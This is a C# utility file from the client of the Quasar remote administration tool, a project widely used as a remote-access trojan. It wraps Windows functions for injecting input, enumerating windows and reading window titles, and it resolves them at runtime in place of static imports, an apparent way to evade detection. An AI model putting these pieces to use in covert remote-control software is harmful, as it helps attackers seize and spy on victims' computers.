using Quasar.Client.Win32PE.PE;
using Quasar.Client.Win32PE.Structs;
using Quasar.Common.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// Provides access to the Win32 API.
    /// </summary>
    public static partial class ClientNatives
    {
        //[DllImport("user32.dll")]
        internal delegate bool GetLastInputInfoFunc(ref LASTINPUTINFO plii);
        internal static bool GetLastInputInfo(ref LASTINPUTINFO plii) => Lookup<GetLastInputInfoFunc>("user32.dll", "GetLastInputInfo")(ref plii);

        //[DllImport("user32.dll")]
        internal delegate bool SetCursorPosFunc(int x, int y);
        internal static bool SetCursorPos(int x, int y) => Lookup<SetCursorPosFunc>("user32.dll", "SetCursorPos")(x, y);

        //[DllImport("user32.dll", SetLastError = false)]
        internal delegate IntPtr GetMessageExtraInfoFunc();
        internal static IntPtr GetMessageExtraInfo() => Lookup<GetMessageExtraInfoFunc>("user32.dll", "GetMessageExtraInfo")();

        /// <summary>
        /// Synthesizes keystrokes, mouse motions, and button clicks.
        /// </summary>
        //[DllImport("user32.dll")]
        internal delegate uint SendInputFunc(uint nInputs, [MarshalAs(UnmanagedType.LPArray), In] INPUT[] pInputs, int cbSize);
        internal static uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize) => Lookup<SendInputFunc>("user32.dll", "SendInput")(nInputs, pInputs, cbSize);

        //[DllImport("user32.dll")]
        internal delegate bool SystemParametersInfoFunc(uint uAction, uint uParam, ref IntPtr lpvParam, uint flags);
        internal static bool SystemParametersInfo(uint uAction, uint uParam, ref IntPtr lpvParam, uint flags) => Lookup<SystemParametersInfoFunc>("user32.dll", "SystemParametersInfoW")(uAction, uParam, ref lpvParam, flags);

        //[DllImport("user32.dll")]
        internal delegate int PostMessageFunc(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);
        internal static int PostMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam) => Lookup<PostMessageFunc>("user32.dll", "PostMessage")(hWnd, wMsg, wParam, lParam);

        //[DllImport("user32.dll", CharSet = CharSet.Unicode)]
        internal delegate IntPtr OpenDesktopFunc([MarshalAs(UnmanagedType.LPWStr)] string hDesktop, int flags, bool inherit, uint desiredAccess);
        internal static IntPtr OpenDesktop([MarshalAs(UnmanagedType.LPWStr)] string hDesktop, int flags, bool inherit, uint desiredAccess) => Lookup<OpenDesktopFunc>("user32.dll", "OpenDesktopW")(hDesktop, flags, inherit, desiredAccess);

        //[DllImport("user32.dll")]
        internal delegate bool CloseDesktopFunc(IntPtr hDesktop);
        internal static bool CloseDesktop(IntPtr hDesktop) => Lookup<CloseDesktopFunc>("user32.dll", "CloseDesktop")(hDesktop);

        //[DllImport("user32.dll")]
        internal delegate bool EnumDesktopWindowsFunc(IntPtr hDesktop, EnumDesktopWindowsProc callback, IntPtr lParam);
        internal static bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsProc callback, IntPtr lParam) => Lookup<EnumDesktopWindowsFunc>("user32.dll", "EnumDesktopWindows")(hDesktop, callback
            , lParam);

        //[DllImport("user32.dll")]
        internal delegate bool IsWindowVisibleFunc(IntPtr hWnd);
        internal static bool IsWindowVisible(IntPtr hWnd) => Lookup<IsWindowVisibleFunc>("user32.dll", "IsWindowVisible")(hWnd);

        //[DllImport("user32.dll")]
        internal delegate IntPtr GetForegroundWindowFunc();
        internal static IntPtr GetForegroundWindow() => Lookup<GetForegroundWindowFunc>("user32.dll", "GetForegroundWindow")();

        //[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal delegate int GetWindowTextFunc(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpString, int nMaxCount);
        internal static int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpString, int nMaxCount) => Lookup<GetWindowTextFunc>("user32.dll", "GetWindowTextW")(hWnd, lpString, nMaxCount);

        // structs
        internal delegate bool EnumDesktopWindowsProc(IntPtr hDesktop, IntPtr lParam);
    }
}
